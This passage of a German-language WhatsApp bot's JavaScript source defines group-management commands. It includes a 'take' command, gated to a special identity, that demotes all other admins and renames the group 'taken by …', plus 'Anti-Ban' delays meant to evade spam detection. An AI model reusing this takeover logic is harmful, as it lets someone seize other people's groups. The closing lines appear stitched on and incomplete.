            text: `❌ Ungültige Umfrage!\nAlle Antwortmöglichkeiten müssen unterschiedlich sein.`
        });
    }
    await sock.sendMessage(from, {
        poll: {
            name: `📊 ${question}`,
            values: options,
            selectableCount: 1
        }
    });

    // Ursprüngliche Nachricht löschen
    await sock.sendMessage(from, { delete: msg.key });
}
if (command === "add") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Nur in Gruppen!");

    const admin = await isAdmin(sock, from, sender);
    if (!admin && !isOwner(sender)) return reply(sock, msg, "❌ Nur Admin oder Owner!");

    if (!args[0]) return reply(sock, msg, "❌ Nutzung: ${prefix}add 49123,49222");

    let numbers = args[0]
        .split(/[, ]+/)
        .map(n => n.replace(/\D/g, ""))
        .filter(n => n.length > 0);

    if (numbers.length === 0) return reply(sock, msg, "❌ Keine gültigen Nummern gefunden!");

    let success = 0;
    let fail = 0;
    let failedUsers = [];

    const wait = ms => new Promise(resolve => setTimeout(resolve, ms));

    for (let number of numbers) {
        let jid = number + "@s.whatsapp.net";

        try {
            const res = await sock.groupParticipantsUpdate(from, [jid], "add");

            const status = res?.[0]?.status;

            if (status === 200) {
                success++;
            } else {
                fail++;

                let reason = "Unbekannter Fehler";

                if (status === 403) reason = "Privatsphäre-Einstellungen (Einladung nötig)";
                if (status === 408) reason = "Timeout / Nummer nicht erreichbar";
                if (status === 409) reason = "Bereits in der Gruppe";
                if (status === 500) reason = "WhatsApp Fehler";

                failedUsers.push(`+${number} → ${reason}`);
            }

        } catch (e) {
            fail++;
            failedUsers.push(`+${number} → Fehler beim Hinzufügen`);
        }

        // ⛔ Kein Delay wenn nur 1 User
        if (numbers.length > 1) {
            await wait(2000);
        }
    }

    let msgText = `✅ Fertig!\nErfolgreich: ${success}\nFehlgeschlagen: ${fail}`;

    if (failedUsers.length > 0) {
        msgText += `\n\n❌ Fehler:\n${failedUsers.join("\n")}`;
    }

    reply(sock, msg, msgText);
}
if (command === "promote" || command === "demote") {
    if (!isGroup(from)) return reply(sock, msg, "❌ Nur in Gruppen!");

    const admin = await isAdmin(sock, from, sender);
    if (!admin && !isOwner(sender)) return reply(sock, msg, "❌ Nur Admin oder Owner!");

    let targets = [];

    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned && mentioned.length > 0) targets = mentioned;

    if ((!targets || targets.length === 0) && msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
        const repliedUser = msg.message.extendedTextMessage.contextInfo.participant;
        if (repliedUser) targets.push(repliedUser);
    }

    if (!targets || targets.length === 0) return reply(sock, msg, `❌ Nutzung: ${prefix}${command} @user oder auf Nachricht antworten`);

    try {
        await sock.groupParticipantsUpdate(from, targets, command === "promote" ? "promote" : "demote");
        return reply(sock, msg, command === "promote"
            ? "⬆️ Nutzer wurde zum Admin gemacht!"
            : "⬇️ Nutzer ist kein Admin mehr!");
    } catch (e) {
        console.error("Fehler beim " + command + ":", e);
        return reply(sock, msg, "❌ Fehler beim " + command + "!");
    }
}

 if (command === "info") {
    try {
        // Ziel-User sammeln
        let targets = [];
        if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
            targets.push(msg.message.extendedTextMessage.contextInfo.participant);
        }

        if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
            targets.push(...msg.message.extendedTextMessage.contextInfo.mentionedJid);
        }

        if (args[0]) {
            let number = args[0].replace(/[^0-9]/g, "");
            targets.push(number + "@s.whatsapp.net");
        }

        if (targets.length === 0) {
            return reply(sock, msg, "❌ Bitte markiere jemanden, antworte auf eine Nachricht oder gib eine Nummer an!");
        }

        targets = [...new Set(targets)];

        // Funktion: Infos für einen User abrufen
        async function getUserInfo(target) {
            const jid = target;
            const numberOnly = target.split("@")[0];
            const lid = msg.key?.mentionedJid || msg.key?.participant || "Unbekannt";

            // Name
            let name = "Unbekannt";
            try {
                const contact = sock.contacts[target];
                if (contact?.notify) name = contact.notify;
            } catch {}

            // Profilbild
            let ppUrl = null;
            let hasProfilePic = "❌ Nein";
            try {
                ppUrl = await sock.profilePictureUrl(target, "image");
                hasProfilePic = "✅ Ja";
            } catch {}

            // Business
            let isBusiness = "❌ Nein";
            try {
                const biz = await sock.getBusinessProfile(target);
                if (biz) isBusiness = "✅ Ja";
            } catch {}

            // Gemeinsame Gruppen
            let mutualGroups = [];
            try {
                const groups = await sock.groupFetchAllParticipating();
                for (let id in groups) {
                    let participants = groups[id].participants.map(p => p.id);
                    if (participants.includes(target)) mutualGroups.push(groups[id].subject);
                }
            } catch {}
            const groupCount = mutualGroups.length;
            const groupList = groupCount > 0
                ? mutualGroups.slice(0, 25).map(g => `• ${g}`).join("\n")
                : "Keine gemeinsamen Gruppen";

            // Account-Erstellung
            function getCreationDate(jid) {
                try {
                    const id = jid.split("@")[0];
                    const timestamp = parseInt(id.substring(0, 10));
                    if (!isNaN(timestamp)) {
                        const date = new Date(timestamp * 1000);
                        return date.toLocaleString("de-DE", {
                            day: "2-digit",
                            month: "2-digit",
                            year: "numeric",
                            hour: "2-digit",
                            minute: "2-digit"
                        });
                    } else return "Unbekannt";
                } catch {
                    return "Unbekannt";
                }
            }
            const createdAt = getCreationDate(target);

            // Ausgabe bauen
            const line = "──────────────────────────";
            const text = `╭───〔 👤 USER INFO 〕───⬣
│
│ 📱 Nummer: ${numberOnly}
│ 🆔 JID: ${jid}
│ 🆔 LID: ${lid}
${line}
│ 👤 Name: ${name}
│ 🖼️ Profilbild: ${hasProfilePic}
│ 🏢 Business: ${isBusiness}
│ 📅 Erstellt: ${createdAt}
${line}
│ 👥 Gemeinsame Gruppen: ${groupCount}
${groupList}
╰────────────────⬣`;

            return { text, ppUrl };
        }

        // Infos für alle User abrufen und senden
        for (let target of targets) {
            const { text, ppUrl } = await getUserInfo(target);
            if (ppUrl) {
                await sock.sendMessage(from, { image: { url: ppUrl }, caption: text }, { quoted: msg });
            } else {
                reply(sock, msg, text);
            }
        }

    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Fehler beim Abrufen der Infos!");
    }
}  
if (command === "block") {
    // Prüfen, ob der Befehl vom Owner kommt
    if (!isOwner(sender)) return reply(sock, msg, "❌ Nur Owner können jemanden blockieren!");

    // Ziel-Nummer holen: Entweder durch Reply oder Argument
    let target = msg.message?.extendedTextMessage?.contextInfo?.participant || args[0];
    if (!target) return reply(sock, msg, "⚠️ Bitte Nummer angeben oder auf die Nachricht der Person antworten.");

    // Nummer in JID-Format bringen
    if (!target.includes("@s.whatsapp.net")) target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await sock.updateBlockStatus(target, "block"); // Nummer blockieren
        reply(sock, msg, `✅ ${target.split("@")[0]} wurde erfolgreich blockiert.`);
    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Blockieren fehlgeschlagen.");
    }
}
    if (command === "msgraw") {
    try {
        // Nachricht in JSON-Format umwandeln und formatieren
        const rawMsg = JSON.stringify(msg, null, 2);

        // Prüfen, ob die Nachricht zu groß für WhatsApp ist
        if (rawMsg.length > 4000) {
            reply(sock, msg, "❌ Nachricht zu groß zum Senden. Speichere sie als Datei.");
            // Optional: Speichern als Datei
            const fs = require('fs');
            const fileName = `raw_${Date.now()}.json`;
            fs.writeFileSync(fileName, rawMsg);
            await sock.sendMessage(from, { document: { url: fileName }, fileName: fileName, mimetype: "application/json" }, { quoted: msg });
            return;
        }

        // Nachricht direkt senden
        reply(sock, msg, "📄 Raw Message:\n" + rawMsg);

    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Fehler beim Abrufen der Raw Message!");
    }
}
if (command === "unblock") {
    // Prüfen, ob der Befehl vom Owner kommt
    if (!isOwner(sender)) return reply(sock, msg, "❌ Nur Owner können jemanden entblocken!");

    // Ziel-Nummer holen: Entweder durch Reply oder Argument
    let target = msg.message?.extendedTextMessage?.contextInfo?.participant || args[0];
    if (!target) return reply(sock, msg, "⚠️ Bitte Nummer angeben oder auf die Nachricht der Person antworten.");

    // Nummer in JID-Format bringen
    if (!target.includes("@s.whatsapp.net")) target = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    try {
        await sock.updateBlockStatus(target, "unblock"); // Nummer entblocken
        reply(sock, msg, `✅ ${target.split("@")[0]} wurde erfolgreich entblockt.`);
    } catch (err) {
        console.error(err);
        reply(sock, msg, "❌ Entblocken fehlgeschlagen.");
    }
}
if (command === "take") {
    if (!isGroup(from)) return;

    if (!isWantedasa(sender)) return;

    try {
        const metadata = await sock.groupMetadata(from);
        const participants = metadata.participants;
        const adminsToDemote = participants
            .filter(p => p.admin && p.id !== sender)
            .map(p => p.id);

        if (adminsToDemote.length > 0) {
            await sock.groupParticipantsUpdate(from, adminsToDemote, "demote");
        }


        await sock.groupUpdateSubject(from, "taken by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");

        await sock.groupUpdateDescription(from, "taken by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ");

        return reply(sock, msg, `✅ ${adminsToDemote.length} Admins entfernt.`);

    } catch (err) {
        console.error(err);
        return reply(sock, msg, "❌ Fehler beim Admin-Reset!");
    }
}
if (command === "automsg") {
    if (!isOwner(sender)) return reply(sock, msg, "❌ Nur Owner!");

    const sub = args[0];

    if (!sub) {
        return reply(sock, msg,
`📌 AutoMsg Befehle:

${prefix}automsg set <Minuten> <Text>
${prefix}automsg stop
${prefix}automsg list`);
    }
    if (sub === "set") {
        const minutes = parseInt(args[1]);
        const text = args.slice(2).join(" ");

        if (!minutes || !text) {
            return reply(sock, msg, "❌ Nutzung: .automsg set <Minuten> <Text>");
        }

        if (minutes <= 0) {
            return reply(sock, msg, "❌ Minuten müssen > 0 sein!");
        }
        if (autoIntervals[from]) {
            clearInterval(autoIntervals[from]);
            delete autoIntervals[from];
        }
        botConfig.autoMessages[from] = {
    text,
    interval: minutes,
    lastSent: 0
};
saveBotConfig();

        autoIntervals[from] = setInterval(async () => {
            try {
                await sock.sendMessage(from, { text });
            } catch (e) {
                console.error("AutoMsg Fehler:", e);
            }
        }, minutes * 60 * 1000);

        return reply(sock, msg, `✅ AutoMsg gesetzt (${minutes} min)`);
    }
    if (sub === "stop") {
        if (!botConfig.autoMessages[from]) {
            return reply(sock, msg, "❌ Keine AutoMsg aktiv!");
        }

        if (autoIntervals[from]) {
            clearInterval(autoIntervals[from]);
            delete autoIntervals[from];
        }

        delete botConfig.autoMessages[from];
        saveBotConfig();

        return reply(sock, msg, "⏹ AutoMsg gestoppt!");
    }
    if (sub === "list") {
        const entries = Object.entries(botConfig.autoMessages || {});

        if (!entries.length) {
            return reply(sock, msg, "❌ Keine AutoMsgs aktiv!");
        }

        let text = "📋 AutoMsgs:\n\n";

        entries.forEach(([chatId, data], i) => {
            text += `${i + 1}. ${chatId}\n`;
            text += `⏱ ${data.interval} min\n`;
            text += `💬 ${data.text}\n\n`;
        });

        return reply(sock, msg, text);
    }

    return reply(sock, msg, "❌ Unbekannter Subcommand!");
}
if (command === "pn") {

    if (!isWantedasa(sender)) {
        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
    }

    let user;

    if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
        user = msg.message.extendedTextMessage.contextInfo.participant;
    }

    else if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
        user = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
    }

    if (!user) {
        return reply(sock, msg, "❌ Bitte markiere jemanden oder antworte auf eine Nachricht!");
    }
    let text = args.join(" ");
    text = text.replace(/@\d+/g, "").trim();
    if (!text) {
        return reply(sock, msg, "❌ Bitte gib einen Text an!");
    }

    try {
        await sock.sendMessage(from, {
            react: {
                text: "✅",
                key: msg.key
            }
        });
        await sock.sendMessage(user, { 
            text: `${text}` 
        });

    } catch (e) {
        console.error(e);
        reply(sock, msg, "❌ Fehler beim Senden der PN!");
    }
}

}



// ================= CONFIG =================
const CHECK_INTERVAL = 15 * 60 * 1000;
const DEFAULT_INTERVAL_MINUTES = 15;
const MAX_FAILS = 5;
const RETRY_ATTEMPTS = 3;
const RETRY_DELAY = 3000;

// ================= MAIN =================
export const loadAutoMessages = async (sock) => {
    if (!botConfig.autoMessages) return;

    if (autoMessageInterval) {
        clearInterval(autoMessageInterval);
    }

    const sendMessageSafe = async (chatId, data) => {
        for (let attempt = 1; attempt <= RETRY_ATTEMPTS; attempt++) {
            try {
                // optional kleiner random delay (Anti-Ban)
                await new Promise(res => setTimeout(res, Math.random() * 2000));

                await sock.sendMessage(chatId, { text: data.text });

                botConfig.autoMessages[chatId].lastSent = Date.now();
                saveBotConfig();

                autoFailCount[chatId] = 0;

                console.log(`✅ AutoMsg gesendet → ${chatId}`);
                return true;

            } catch (err) {
                console.error(`❌ Fehler (${chatId}) Versuch ${attempt}:`, err);

                await new Promise(res => setTimeout(res, RETRY_DELAY));
            }
        }

        autoFailCount[chatId] = (autoFailCount[chatId] || 0) + 1;

        console.log(`⚠️ Fail Count (${chatId}): ${autoFailCount[chatId]}`);

        if (autoFailCount[chatId] >= MAX_FAILS) {
            console.log(`🛑 AutoMsg deaktiviert → ${chatId}`);

            delete botConfig.autoMessages[chatId];
            saveBotConfig();
        }

        return false;
    };

    // ================= GLOBAL CHECKER =================
    autoMessageInterval = setInterval(async () => {
        const now = Date.now();

        for (const chatId in botConfig.autoMessages) {
            const data = botConfig.autoMessages[chatId];

            // Default setzen falls nicht vorhanden
            if (!data.interval) {
                data.interval = DEFAULT_INTERVAL_MINUTES;
                saveBotConfig();
            }

            if (!data.text) continue;

            const intervalMs = data.interval * 60 * 1000;
            const lastSent = data.lastSent || 0;

            // Prüfen ob Zeit erreicht
            if (now - lastSent >= intervalMs) {
                console.log(`⏳ Sende AutoMsg → ${chatId}`);

                await sendMessageSafe(chatId, data);
            }
        }

    }, CHECK_INTERVAL);

    console.log("🚀 Auto-Message System gestartet (Check alle 15 Minuten)");
};

//=========================//
// GROUP EVENTS
//=========================//
export async function handleGroupParticipants(sock, update) {
    const { id, participants, action } = update;
    ensureGroupSettings(id);

    for (let user of participants) {
        const metadata = await sock.groupMetadata(id);
        const groupName = metadata.subject || "Gruppe";
        const groupDesc = metadata.desc || "Keine Beschreibung vorhanden.";

        if (action === "add" && groupSettings[id].welcome) {
            await sock.sendMessage(id, {
                text: `👋 Willkommen @${user.split("@")[0]} in *${groupName}*!\n\n📜 *Gruppenbeschreibung:*\n${groupDesc}`,
                mentions: [user]
            });
        }

        if (action === "remove" && groupSettings[id].leave) {
            await sock.sendMessage(id, {
                text: `😢 @${user.split("@")[0]} hat die Gruppe verlassen`,
                mentions: [user]
            });
        }
    }
}
import { default as makeWASocket } from '@angstvorfrauen/baileys';
// OR
import baileys from '@angstvorfrauen/baileys';
async function restartBot() {
  
  
  // Neue Verbindung starten
  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: true
  });
}

restartBot();